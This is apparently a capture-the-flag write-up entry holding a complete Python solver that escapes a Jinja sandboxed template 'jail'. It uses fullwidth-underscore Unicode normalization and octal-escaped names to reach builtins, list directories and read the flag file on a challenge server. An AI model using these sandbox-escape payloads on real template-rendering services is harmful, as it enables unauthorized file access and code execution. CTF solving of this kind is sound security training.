        "title": "Automated Solver Script (solve.py)",
        "content": "Implementasi solver mandiri untuk menyelesaikan challenge secara deterministik. Jalankan dengan `python3 solve.py`.",
        "code": "#!/usr/bin/env python3\n\"\"\"Exploit the Unicode-normalization bypass in the LetMeOut Jinja jail.\"\"\"\n\nfrom __future__ import annotations\n\nimport ast\nimport sys\nfrom pathlib import Path\n\nfrom pwn import args, context, log, process, remote\n\n\nBASE_DIR = Path(__file__).resolve().parent\nJAIL_PATH = BASE_DIR / \"jail.py\"\nFILTER_NAMES = (\"buff\", \"cuff\", \"duff\", \"guff\", \"huff\", \"luff\", \"muff\", \"puff\", \"ruff\", \"tuff\")\nPROMPT = b\"> \"\nTIMEOUT = 8\n\ncontext.log_level = \"info\"\n\n\ndef start():\n    if args.REMOTE:\n        host = args.HOST or \"letmeout-e3fddc35a860.chall.hiddeninvestigations.net\"\n        port = int(args.PORT or 1337)\n        return remote(host, port, ssl=True, timeout=TIMEOUT)\n    return process([sys.executable, str(JAIL_PATH)], cwd=str(BASE_DIR))\n\n\ndef encoded_string(value: str, allowed: str) -> str:\n    \"\"\"Build an ASCII Jinja string literal without adding filter letters.\"\"\"\n    body = \"\".join(\n        char if char in allowed else f\"\\\\{ord(char):03o}\"\n        if char.isalpha()\n        else char\n        for char in value\n    )\n    return f'\"{body}\"'\n\n\ndef tag_key(value: str, alias: str) -> str:\n    \"\"\"Encode a private name with a fullwidth leading underscore, then Tag it.\"\"\"\n    if not value.startswith(\"_\"):\n        raise ValueError(\"tag_key is only for underscore-prefixed attributes\")\n    rest = value[1:]\n    body = \"\".join(\n        char if char in alias else f\"\\\\{ord(char):03o}\"\n        if char.isalpha()\n        else char\n        for char in rest\n    )\n    return f'\"\\\\uff3f{body}\"|{alias}'\n\n\ndef listing_payload(alias: str) -> str:\n    # Tag.__str__ applies NFKC. SandboxedEnvironment.getitem converts the key\n    # with str(), but checks safety using the original fullwidth-prefixed Tag.\n    payload = \"{{(''|\" + alias + \")\"\n    payload += f\"[{tag_key('__str__', alias)}]\"\n    payload += f\"[{tag_key('__builtins__', alias)}]\"\n    payload += f\"[{encoded_string('__import__', alias)}]\"\n    payload += '(\"\\\\157\\\\163\")'\n    payload += f\"[{encoded_string('listdir', alias)}]()}}}}\"\n    return payload\n\n\ndef read_payload(alias: str, filename: str) -> str:\n    payload = \"{{(''|\" + alias + \")\"\n    payload += f\"[{tag_key('__str__', alias)}]\"\n    payload += f\"[{tag_key('__builtins__', alias)}]\"\n    payload += f\"[{encoded_string('open', alias)}]({encoded_string(filename, alias)})\"\n    payload += f\"[{encoded_string('read', alias)}]()}}}}\"\n    return payload\n\n\ndef check_payload(payload: str) -> None:\n    letters = {char for char in payload if char.isalpha()}\n    if not payload.isascii() or len(payload) > 170 or len(letters) > 3:\n        raise ValueError(\n            f\"generated input violates jail limits: len={len(payload)}, letters={sorted(letters)}\"\n        )\n\n\ndef query(io, payload: str) -> str:\n    check_payload(payload)\n    try:\n        # recvuntil after the previous query already consumed this prompt.\n        if not getattr(io, \"_letmeout_prompt_ready\", False):\n            prompt = io.recvuntil(PROMPT, timeout=TIMEOUT)\n            if not prompt.endswith(PROMPT):\n                raise RuntimeError(\"timed out waiting for the jail prompt\")\n        io.sendline(payload.encode(\"ascii\"))\n        response = io.recvuntil(PROMPT, drop=True, timeout=TIMEOUT)\n        io._letmeout_prompt_ready = True\n    except EOFError as exc:\n        raise RuntimeError(\"service closed the connection before returning a result\") from exc\n    return response.decode(\"utf-8\", errors=\"replace\").strip()\n\n\ndef find_listing(io) -> tuple[str, list[str]]:\n    for alias in FILTER_NAMES:\n        output = query(io, listing_payload(alias))\n        try:\n            files = ast.literal_eval(output)\n        except (ValueError, SyntaxError):\n            continue\n        if isinstance(files, list) and files and all(isinstance(name, str) for name in files):\n            log.success(f\"rich filter alias: {alias}; listed {len(files)} files\")\n            return alias, files\n    raise RuntimeError(\"no rich filter alias produced a directory listing\")\n\n\ndef main() -> None:\n    io = start()\n    try:\n        alias, files = find_listing(io)\n        if not args.REMOTE:\n            files = [\"flag.txt\"] if \"flag.txt\" in files else files[:1]\n        findings: list[tuple[str, str]] = []\n        for filename in files:\n            output = query(io, read_payload(alias, filename))\n            findings.append((filename, output))\n\n        decoy = \"not the flag you're looking for\"\n        candidates = [(name, data) for name, data in findings if data.strip() != decoy]\n        if args.REMOTE:\n            for filename, data in findings:\n                log.info(f\"{filename}: {data.strip()}\")\n            if not candidates:\n                raise RuntimeError(\"all listed files matched the decoy contents\")\n            for _, flag in candidates:\n                print(f\"<FLAG>{flag.strip()}</FLAG>\")\n        else:\n            for filename, data in findings:\n                print(f\"[local artifact] {filename}: {data.strip()}\")\n            log.info(\"Local files are only a path validation; use REMOTE=1 for the challenge flag.\")\n        io.interactive() if args.INTERACTIVE else None\n    finally:\n        io.close()\n\n\nif __name__ == \"__main__\":\n    main()"
